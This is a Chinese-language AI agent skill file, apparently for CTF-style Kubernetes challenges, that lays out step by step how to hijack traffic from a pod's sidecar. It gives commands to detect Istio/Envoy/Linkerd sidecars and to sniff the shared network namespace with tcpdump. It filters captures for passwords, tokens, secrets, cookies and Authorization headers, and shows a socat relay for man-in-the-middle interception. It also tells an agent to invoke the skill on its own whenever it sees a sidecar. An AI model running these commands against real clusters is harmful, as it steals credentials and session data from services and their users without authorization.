---
name: k8s-sidecar-attack
description: "Kubernetes Sidecar 容器流量劫持与敏感信息窃取。当目标 Pod 存在 Istio/Envoy/Linkerd sidecar、题目提到'隐形旁观者'或'共享网络'、或需要从 Pod 内部嗅探流量时使用。覆盖 tcpdump 抓包、sidecar 明文流量捕获、共享网络命名空间利用。只要在 K8s Pod 中发现有 sidecar 或多容器共存的迹象，就应使用此技能"
metadata:
  tags: "k8s,kubernetes,sidecar,istio,envoy,tcpdump,traffic,sniffing,流量劫持,抓包"
  category: "cloud"
---

# Kubernetes Sidecar 流量劫持

同一 Pod 内的所有容器共享网络命名空间——这是 K8s 的设计决定，也是攻击者的福音。Sidecar 容器（如 Istio Envoy）发送的流量可以被同 Pod 的任何容器通过 tcpdump 直接抓取，因为它们共享同一张网卡。

```
Pod 网络命名空间（共享）
┌──────────────────────────────────┐
│  [你的容器]  ←── 同一网卡 ──→  [Sidecar]  │
│       ↓                        ↓       │
│    tcpdump 能抓到 sidecar 的所有流量        │
└──────────────────────────────────┘
```

---

## Phase 1: 检测 Sidecar

```bash
# 最可靠：看进程列表中有没有 envoy / pilot-agent / linkerd-proxy
ps aux 2>/dev/null | grep -E 'envoy|pilot-agent|linkerd'
# 看到 envoy 或 pilot-agent → 确认 Istio sidecar 存在

# 环境变量（Istio 注入后会设置这些）
env | grep -i istio
# ISTIO_META_* 开头的变量 → 确认 Istio

# 网络接口（辅助判断，不能单独确认）
ip addr
# 看到 istio0 / lo 以外的多个接口 → 可能有 sidecar，需结合上面确认

# DNS 配置
cat /etc/resolv.conf  # search 行包含 istio 相关条目
```

---

## Phase 2: 流量抓包

Sidecar 内部通常使用 HTTP 明文通信（mTLS 在 Envoy 层终止后再转发），所以 tcpdump 能直接看到请求内容。

### 基本抓包

```bash
# 全流量抓包（-A 显示 ASCII，能直接看到 HTTP 内容）
tcpdump -A -vvv

# 只抓 HTTP 流量（减少噪音）
tcpdump -A -s 0 'tcp port 80 or tcp port 8080'

# 直接过滤敏感关键词
tcpdump -A -s 0 | grep -i -A5 'flag\|secret\|password\|token\|key'

# 保存 pcap 后续用 Wireshark 分析
tcpdump -w /tmp/capture.pcap -c 1000
```

### 针对性抓包

```bash
# 抓特定服务的流量
tcpdump -A host <target-service-ip>

# 抓 POST 请求体（通常 credential 在 POST body 里）
tcpdump -A -s 0 'tcp dst port 80' | grep -A 20 'POST'
```

---

## Phase 3: 分析结果

抓到的流量中寻找：

1. **HTTP 请求/响应体** — flag、token、credential
2. **Authorization Header** — Bearer token、Basic auth
3. **Cookie** — session ID
4. **POST body** — 表单数据、JSON payload
5. **Service 间通信** — 内部 API 调用暴露的敏感数据

---

## 无 tcpdump 时的替代方案

```bash
# 查看当前活跃连接（推断有哪些服务在通信）
cat /proc/net/tcp
cat /proc/net/tcp6
ss -tlnp
netstat -tlnp 2>/dev/null

# 如果有 socat，可以做端口转发中间人抓取经过的流量
socat -v TCP-LISTEN:8080,fork TCP:<target-svc>:80
# -v 会在 stderr 打印双向流量内容
```

---

## 注意事项

- 流量可能是**周期性的**（cron job、定时上报），需要持续监听至少 **30-60 秒**
- 关注 `reporting-service`、`metrics`、`webhook` 等命名的服务请求
- 如果抓到的全是加密流量，说明 mTLS 没在 sidecar 层终止——换思路，尝试 `Skill(skill="k8s-istio-bypass")` 绕过策略

## 相关技能

- 还没做服务发现？先 `Skill(skill="k8s-network-recon")` 确定有哪些服务
- 发现 Istio AuthorizationPolicy 阻拦 → `Skill(skill="k8s-istio-bypass")`
- 发现 NFS/EFS 挂载 → `Skill(skill="k8s-storage-exploit")`
